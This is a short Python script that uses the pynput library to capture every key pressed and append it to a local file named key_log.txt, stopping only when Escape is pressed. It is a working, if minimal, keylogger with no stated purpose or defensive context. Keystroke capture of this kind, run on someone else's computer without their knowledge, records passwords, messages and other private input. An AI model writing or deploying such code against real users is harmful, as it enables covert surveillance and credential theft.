from pynput import keyboard

logFile = "key_log.txt"



def on_press(key):
    try:
        with open(logFile, "a") as f:
            f.write(f"{ key.char }")
    except AttributeError:
        with open(logFile, "a") as f:
            f.write(f"[{ key.name }]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

